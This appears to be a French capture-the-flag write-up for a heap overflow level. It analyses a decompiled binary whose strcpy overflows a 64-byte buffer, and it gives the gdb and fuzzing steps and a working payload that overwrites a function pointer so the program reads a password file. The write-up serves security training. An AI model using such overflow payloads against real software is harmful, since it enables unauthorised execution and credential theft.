# Level 6 - Heap overflow

## 1. Analyse du binaire
```c
int n()
{
  return system("/bin/cat /home/user/level7/.pass");
}

int m()
{
  return puts("Nope");
}

int main(int argc, const char **argv)
{
  char *v5;
  int (**v4)(void);

  v5 = (char *)malloc(0x40);      // malloc 64 bytes
  v4 = malloc(4);                 // malloc 4 bytes pour stocker un pointeur de fonction
  *v4 = m;                        // stocke l'adresse de m() dans v4
  strcpy(v5, argv[1]);           // copie l'argument dans v5 sans vérification de taille
  return (*v4)();                // appelle la fonction pointée par v4
}
```

## 2. Vulnérabilité
- `strcpy()` est utilisé sans vérification de taille
- On peut déborder du premier buffer (`v5`) pour écraser le pointeur de fonction dans `v4`
- Le programme appelle la fonction pointée par `v4` à la fin

## 3. Exploitation
1. Trouver l'adresse de la fonction `n()` :
```bash
(gdb) p n
$1 = {<text variable, no debug info>} 0x8048454 <n>
```

2. Trouver la taille exacte du padding par fuzzing :
```bash
./level6 $(python -c 'print "A"*64')    # Taille du premier malloc
./level6 $(python -c 'print "A"*68')    # Test
./level6 $(python -c 'print "A"*72')    # Crash - on a trouvé la bonne taille
```

3. Construction de l'exploit :
- 72 bytes de padding pour atteindre `v4`
- Adresse de `n()` (0x8048454) en little-endian

```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

## 4. Explication
1. Les 72 premiers bytes :
   - 64 bytes remplissent le buffer alloué par le premier malloc
   - 8 bytes supplémentaires pour atteindre l'adresse stockée dans `v4`
2. Les 4 derniers bytes ("\x54\x84\x04\x08") :
   - Écrasent le pointeur de fonction dans `v4`
   - Contiennent l'adresse de `n()` en little-endian
3. Quand le programme exécute `(*v4)()` :
   - Au lieu d'appeler `m()`
   - Il appelle `n()`
   - Qui affiche le contenu de `/home/user/level7/.pass`